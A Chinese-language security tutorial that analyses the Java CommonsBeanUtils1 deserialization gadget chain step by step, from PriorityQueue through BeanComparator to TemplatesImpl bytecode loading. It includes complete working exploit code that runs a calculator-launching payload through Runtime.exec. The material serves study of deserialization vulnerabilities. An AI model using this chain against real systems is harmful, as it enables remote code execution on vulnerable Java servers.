# Java 反序列化之 CommonsBeanUtils1 反序列化

## 0x01 前言

因为后续的漏洞利用当中，CommonsBeanUtils 这一条链子还是比较重要的，不论是 shiro 还是后续的 fastjson，都是比较有必要学习的。

在已经学习一些基础知识与 CC 链的情况下，最终链子就可以自己跟着 yso 的链子利用走一遍写 EXP 了。

## 0x02 环境

jdk8 不受版本影响均可
其余环境如下所示

XML

```
<dependency>  
 <groupId>commons-beanutils</groupId>  
 <artifactId>commons-beanutils</artifactId>  
 <version>1.9.2</version>  
</dependency>  
<!-- https://mvnrepository.com/artifact/commons-collections/commons-collections -->  
<dependency>  
 <groupId>commons-collections</groupId>  
 <artifactId>commons-collections</artifactId>  
 <version>3.1</version>  
</dependency>  
<!-- https://mvnrepository.com/artifact/commons-logging/commons-logging -->  
<dependency>  
 <groupId>commons-logging</groupId>  
 <artifactId>commons-logging</artifactId>  
 <version>1.2</version>  
</dependency>
```

## 0x03 CommonsBeanUtils 简介

Apache Commons 工具集下除了 `collections` 以外还有 `BeanUtils` ，它主要用于操控 `JavaBean` 。

- 以 Utils 结尾，一般这都是一个工具类/集

> 先说说 JavaBean 的这个概念

这里指的就是实体类的 get，set 方法，其实在 IDEA 当中用 Lombok 插件就可以替换 JavaBean。

关于 JavaBean 的说明可以参考廖雪峰老师的[文章](https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680)

CommonsBeanUtils 这个包也可以操作 JavaBean，举例如下：

比如 Baby 是一个最简单的 JavaBean 类

JAVA

```
public class Baby {  
    private String name = "Drunkbaby";  
  
 public String getName(){  
        return name;  
 }  
  
    public void setName (String name) {  
        this.name = name;  
 }  
}
```

这里定义两个简单的 getter setter 方法，如果用 `@Lombok` 的注解也是同样的，使用 `@Lombok` 的注解不需要写 getter setter。

Commons-BeanUtils 中提供了一个静态方法 `PropertyUtils.getProperty` ，让使用者可以直接调用任意 JavaBean 的 getter 方法，示例如下

JAVA

```
import org.apache.commons.beanutils.PropertyUtils;  
  
public class CBMethods {  
    public static void main(String[] args) throws Exception{  
        System.out.println(PropertyUtils.getProperty(new Baby(), "name"));  
 }  
}
```

![img](https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PropertyUtils.png)

此时，Commons-BeanUtils 会自动找到 name 属性的getter 方法，也就是 getName ，然后调用并获得返回值。这个形式就很自然得想到能任意函数调用。

## 0x04 CommonsBeanUtils1 链子分析

- 还是和之前一样，进行逆向分析。这里的链子和 CC4 的前半部分链子是基本一致的。

### 1. 链子尾部

我们链子的尾部是通过动态加载 TemplatesImpl 字节码的方式进行攻击的，原因很简单：

在之前讲动态加载 TemplatesImpl 字节码的时候，我们的链子是这样的

JAVA

```
TemplatesImpl#getOutputProperties() -> TemplatesImpl#newTransformer() ->

TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses()

-> TransletClassLoader#defineClass()
```

在链子的最开头 ———— `TemplatesImpl.getOutputProperties()`，它是一个 getter 方法，并且作用域为 public，所以可以通过 CommonsBeanUtils 中的 `PropertyUtils.getProperty()` 方式获取，

这里我们的 `PropertyUtils.getProperty()` 对应的参数应该这么传

JAVA

```
// 伪代码
PropertyUtils.getProperty(TemplatesImpl, outputProperties)
```

### 2. 中间链子

上一步我们说到尾部是 `PropertyUtils.getProperty()`，我们就去看看谁调用了 `PropertyUtils.getProperty()`

![img](https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/FindCompare.png)

这里的 compare() 方法比较符合条件，因为它经常被其他方法所调用，作为链子的一部分来说，我们是很喜欢这种方法的。

继续找谁调用了 compare() 方法，这里就太多了，我们优先去找能够进行序列化的类，于是这里找到了 `PriorityQueue` 这个类。

```
PriorityQueue` 这个类的 `siftDownUsingComparator()` 方法调用了 `compare()
```

![img](https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/siftDownUsingComparator.png)

继续找谁调用了 `siftDownUsingComparator()` 方法，发现在同一个类中的 `siftDown()` 方法调用了它。

![img](https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/siftDown.png)

- 同样，发现同个类下的 `heapify()` 方法调用了 `siftDown()` 方法

![img](https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/heapify.png)

如法炮制，直到最后能够找到入口类为止

### 3. 寻找 readObject() 的入口类

我们在寻找谁调用 `heapify()` 方法时，成功找到了 `readObejct()` 方法

到目前，我们一整条链子就找好了，链子流程如下。

JAVA

```
PriorityQueue.readObject()
PriorityQueue.heapify()  ->
	
	PriorityQueue.siftDown()
	PriorityQueue.siftDownUsingComparator() ->
	
		BeanComparator.compare() ->
PropertyUtils.getProperty(TemplatesImpl, outputProperties)
	->
			TemplatesImpl.getOutputProperties()
			TemplatesImpl.newTransformer()
			TemplatesImpl.getTransletInstance()
			TemplatesImpl.defineTransletClasses()
```

接下来画个流程图。因为前半部分和 CC4 是一样的，所以我们把它加到整个 CC 链里面去。

![img](https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ALLCC.png)

## 0x05 CommonsBeanUtils1 EXP 编写

yso 官方这里的话没有给出 CB1 链子的 Gadget，大概是人家觉得太短了没什么必要吧，我这里自己手写一遍 EXP。

> `CommonsBeanUtils1` 的链子又两个主要的部分组成:

- 一部分是利用 `TemplatesImpl` 动态加载字节码。
- 另一部分是通过 `CommonsBeanUtils` 中的 `PropertyUtils` 读取 getter 请求。

下面我们逐一讲解

### 1. 尾部链子 ———— 利用 TemplatesImpl 动态加载字节码

- 我们先跟进 TemplatesImpl 这个包中看 TemplatesImpl 的结构图

![img](https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/TemplateImplBag.png)

可以看到在 `TemplatesImpl` 类中还有一个内部类 `TransletClassLoader`，这个类是继承 `ClassLoader`，并且重写了 `defineClass` 方法。

![img](https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/TemplateImplCode.png)

- 简单来说，这里的 `defineClass` 由其父类的 protected 类型变成了一个 default 类型的方法，可以被类外部调用。

我们从 `TransletClassLoader#defineClass()` 向前追溯一下调用链：

JAVA

```
TemplatesImpl#getOutputProperties() -> TemplatesImpl#newTransformer() ->

TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses()

-> TransletClassLoader#defineClass()
```

追到最前面两个方法 `TemplatesImpl#getOutputProperties()` 和 `TemplatesImpl#newTransformer()` ，这两者的作用域是public，可以被外部调用。

我们尝试用 `TemplatesImpl#newTransformer()` 构造一个简单的 POC

首先先构造字节码，注意，这里的字节码必须继承`AbstractTranslet`，因为继承了这一抽象类，所以必须要重写一下里面的方法。

JAVA

```
package src.DynamicClassLoader.TemplatesImplClassLoader;  
  
import com.sun.org.apache.xalan.internal.xsltc.DOM;  
import com.sun.org.apache.xalan.internal.xsltc.TransletException;  
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;  
  
import java.io.IOException;  
  
// TemplatesImpl 的字节码构造  
public class TemplatesBytes extends AbstractTranslet {  
    public void transform(DOM dom, SerializationHandler[] handlers) throws TransletException{}  
    public void transform(DOM dom, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException{}  
    public TemplatesBytes() throws IOException{  
        super();  
 Runtime.getRuntime().exec("Calc");  
 }  
}
```

字节码这里的编写比较容易，我就一笔带过了，接下来我们重点关注 POC 是如何编写出来的。

因为是一整条链子，参考最开始我们讲的 URLDNS 链，我们需要设置其一些属性值，从而让我们的链子传递下去。我这里先把 POC 挂出来，结合着讲。

JAVA

```
package src.DynamicClassLoader.TemplatesImplClassLoader;  
  
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
  
// 主程序  
public class TemplatesRce {  
    public static void main(String[] args) throws Exception{  
        byte[] code = Files.readAllBytes(Paths.get("E:\\JavaClass\\TemplatesBytes.class"));  
 TemplatesImpl templates = new TemplatesImpl();  
 setFieldValue(templates, "_name", "Calc");  
 setFieldValue(templates, "_bytecodes", new byte[][] {code});  
 setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());  
 templates.newTransformer();  
 }  
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{  
        Field field = obj.getClass().getDeclaredField(fieldName);  
 field.setAccessible(true);  
 field.set(obj, value);  
 }  
}
```

我们定义了一个设置私有属性的方法，命名为 `setFieldValue`，根据我们的链子，一个个看。

> TemplatesImpl#getOutputProperties() ->
> TemplatesImpl#newTransformer() ->
> TemplatesImpl#getTransletInstance() ->
> TemplatesImpl#defineTransletClasses() ->
> TransletClassLoader#defineClass()

- 主要是三个私有类的属性

  JAVA

  ```
  setFieldValue(templates, "_name", "Calc"); 
  ```

  

显然，`_name` 不能为 null，我们才能进入链子的下一部分。
链子的下一部分为 `defineTransletClasses`，我们跟进去。

![img](https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/defineTransletClasses.png)

`_tfactory` 需要是一个 `TransformerFactoryImpl` 对象，因为 `TemplatesImpl#defineTransletClasses()` 方法里有调用到 `_tfactory.getExternalExtensionsMap()` ，如果是 null 会出错。

TemplatesBytes.class 这里是一个弹计算器的恶意类，代码如下

JAVA

```
package src.DynamicClassLoader.URLClassLoader;  
  
import java.io.IOException;  
  
// 弹计算器的万能类  
public class Calc {  
    static {  
        try {  
            Runtime.getRuntime().exec("calc");  
 } catch (IOException e){  
            e.printStackTrace();  
 }  
    }  
}
```

弹计算器成功

![img](https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/TemplatesImplSuccess.png)

### 2. 中间 EXP 编写

因为中间链子比较短，这里就直接写整段 EXP 了

在写 EXP 之前，我们先好好看一看 `BeanComparator.compare()` 方法：

![img](https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/compare.png)

这个方法传入两个对象，如果 this.property 为空，则直接比较这两个对象；如果 this.property 不为空，则用 PropertyUtils.getProperty 分别取这两个对象的 this.property 属性，比较属性的值。

所以如果需要传值比较，肯定是需要新建一个 `PriorityQueue` 的队列，并让其有 2 个值进行比较。而且 `PriorityQueue` 的构造函数当中就包含了一个比较器。

![img](https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PriorityConstructor.png)

我们的 EXP 如下，最后使用 queue.add 就可以自动完成比较是因为 add 方法调用了 compare 方法，如图。

![img](https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Route.png)

JAVA

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.beanutils.BeanComparator;  
import org.apache.commons.beanutils.PropertyUtils;  
  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.PriorityQueue;  
  
public class CommonBeans1EXP {  
    public static void main(String[] args) throws Exception{  
        byte[] code = Files.readAllBytes(Paths.get("E:\\JavaClass\\TemplatesBytes.class"));  
 TemplatesImpl templates = new TemplatesImpl();  
 setFieldValue(templates, "_name", "Calc");  
 setFieldValue(templates, "_bytecodes", new byte[][] {code});  
 setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());  
 //    templates.newTransformer();  
 final BeanComparator beanComparator = new BeanComparator();  
 // 将 property 的值赋为 outputProperties setFieldValue(beanComparator, "property", "outputProperties");  
 // 创建新的队列，并添加恶意字节码  
 final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);  
 queue.add(templates);  
 queue.add(templates);  
 }  
  
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{  
        Field field = obj.getClass().getDeclaredField(fieldName);  
 field.setAccessible(true);  
 field.set(obj, value);  
 }  
}
```

- 成功弹出计算器

![img](https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/SuccessCalc.png)

### 3. 结合入口类的最终 EXP 编写

- 此处我们需要控制在它序列化的时候不弹出计算器，在反序列化的时候弹出计算器，于是通过反射修改值。

先将 queue.add 赋一个无关痛痒的常量，再通过反射修改值即可，伪代码如下

JAVA

```
queue.add(1);  
queue.add(1);  
  
// 将 property 的值赋为 outputPropertiessetFieldValue(beanComparator, "property", "outputProperties");  
setFieldValue(queue, "queue", new Object[]{templates, templates});
```

完整的 EXP 如下

JAVA

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.beanutils.BeanComparator;  
import org.apache.commons.beanutils.PropertyUtils;  
  
import java.io.*;  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.PriorityQueue;  
  
public class CB1FinalEXP {  
    public static void main(String[] args) throws Exception{  
        byte[] code = Files.readAllBytes(Paths.get("E:\\JavaClass\\TemplatesBytes.class"));  
 TemplatesImpl templates = new TemplatesImpl();  
 setFieldValue(templates, "_name", "Calc");  
 setFieldValue(templates, "_bytecodes", new byte[][] {code});  
 setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());  
 //    templates.newTransformer();  
 final BeanComparator beanComparator = new BeanComparator();  
 // 创建新的队列，并添加恶意字节码  
 final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);  
 queue.add(1);  
 queue.add(1);  
  
 // 将 property 的值赋为 outputProperties 
 setFieldValue(beanComparator, "property", "outputProperties");  
 setFieldValue(queue, "queue", new Object[]{templates, templates});  
 serialize(queue);  
 unserialize("ser.bin");  
 }  
  
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{  
        Field field = obj.getClass().getDeclaredField(fieldName);  
 field.setAccessible(true);  
 field.set(obj, value);  
 }  
  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
 oos.writeObject(obj);  
 }  
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  
 Object obj = ois.readObject();  
 return obj;  
 }  
}
```

成功弹出计算器

![img](https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/FinalEXP.png)

## 0x06 小结

这条链子比较简单，我的建议是自己可以完完全全地手写一遍 EXP